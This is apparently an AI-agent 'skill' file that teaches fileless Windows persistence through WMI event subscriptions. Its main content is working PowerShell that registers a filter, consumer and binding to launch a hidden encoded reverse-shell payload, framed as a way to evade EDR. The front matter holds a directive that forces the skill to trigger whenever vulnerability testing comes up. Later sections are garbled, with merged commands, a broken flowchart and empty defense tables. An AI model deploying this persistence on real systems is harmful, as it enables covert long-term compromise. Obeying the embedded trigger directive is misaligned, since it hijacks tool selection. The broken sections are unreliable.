---
name: wmi-event-subscription
description: >
  [CRITICAL: MUST trigger this skill whenever related vulnerability testing is discussed.]
  Establish highly stealthy, fileless persistence on Windows systems using Windows Management 
  Instrumentation (WMI) Event Subscriptions. An attacker can bind malicious actions (ActiveScript 
  or CommandLine) to specific system events (like startup or time intervals).
domain: cybersecurity
subdomain: red-teaming
category: Persistence
difficulty: expert
estimated_time: "2-3 hours"
mitre_attack:
  tactics: [TA0003, TA0004]
  techniques: [T1546.003]
platforms: [windows]
tags: [wmi, persistence, fileless, active-directory, red-teaming]
tools: [powershell, wmic]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# WMI Event Subscription Persistence

## When to Use
- When executing advanced Red Team operations where traditional persistence mechanisms (like Registry Run keys or Scheduled Tasks) are closely monitored by Endpoint Detection and Response (EDR) solutions.
- To achieve "fileless" persistence where the malicious payload is stored entirely within the WMI repository (`OBJECTS.DATA`), residing completely outside the traditional file system.
- To trigger specific malicious payloads based solely on contextual system events, such as when a specific application is launched, a certain time is reached, or a user logs in.

## Workflow

### Phase 1: Understanding the WMI Triad

```text
# Concept: WMI Event Subscriptions require three distinct components to function together symbiotically.

# 1. The Event Filter: "When should the payload trigger?"
# A WQL (WMI Query Language) query that polling the system for a specific event.
# Example: "Trigger when a process named 'calc.exe' starts within the last 5 seconds."

# 2. The Event Consumer: "What action should occur?"
# Contains the malicious payload. This can be a `CommandLineEventConsumer` (executes a binary/command) 
# or an `ActiveScriptEventConsumer` (executes VBScript or JScript).

# 3. The FilterToConsumerBinding: "Link the trigger to the action."
# The bridge that connects the Filter (When) to the Consumer (Action). Without this, the WMI system 
# knows what event to look for and what action exists, but doesn't know they are related.
```

### Phase 2: Crafting the PowerShell Payload

```powershell
# We will use PowerShell locally to construct the three WMI components seamlessly.
# You must run this from an Elevated Command Prompt (Administrator).

# 1. Define the Event Filter (Triggering on system startup or 60 seconds uptime)
$FilterArgs = @{
    Name = "UpdaterServiceFilter"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
}
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $FilterArgs

# 2. Define the Event Consumer (The Malicious Command)
# In this example, we spawn a hidden PowerShell process referencing an external payload or base64 string.
$payload = "powershell.exe -NoP -Sta -NonI -W Hidden -Enc {Base64_Encoded_Reverse_Shell...}"
$ConsumerArgs = @{
    Name = "UpdaterServiceConsumer"
    CommandLineTemplate = $payload
}
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs

# 3. Bind the Filter to the Consumer
$BindArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}
$Binding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $BindArgs

Write-Host "WMI Event Subscription successfully embedded!"
```

### Phase 3: Validating the Persistence

```powershell
# Concept: To ensure the persistence works, you can manually trigger the event or wait.
# To check if your WMI entries 1. List the hidden Event Filters Get-WmiObject -Namespace root\subscription -Class __EventFilter | Select Name, Query

# 2. List the hidden Event Consumers Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Select Name, CommandLineTemplate

# 3. List the Bindings Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Select Filter, Consumer
```

### Phase 4: Cleanup (Critical for OPSEC)

```powershell
# When the operation completes, you MUST Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='UpdaterServiceFilter'" | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='UpdaterServiceConsumer'" | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -Filter "Filter=""__EventFilter.Name='UpdaterServiceFilter'""" | Remove-WmiObject
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Achieve Administrative Access ] --> B[Implement WMI Event Subscription ]
    B --> C{Does }
    C -->|Yes| D[Test ]
    C -->|No| E[Check D --> F[Persistence ]
```

## 🔵 Blue Team Detection & Defense
- **Sysmon Event ID 19, 20, 21**: Microsoft Sysmon **WMI Repository Parsing**: Tools **Authorization**: Restrict Key Concepts
| Concept | Description |
|---------|-------------|
| Fileless Malware | |
| WQL | |

## References
- MITRE ATT&CK: [Event-Triggered Execution: Windows Management Instrumentation Event Subscription](https://attack.mitre.org/techniques/T1546/003/)
- FireEye: [Windows Management Instrumentation (WMI) Offense, Defense, and Forensics](https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/sans-wmi-offense-defense.pdf)
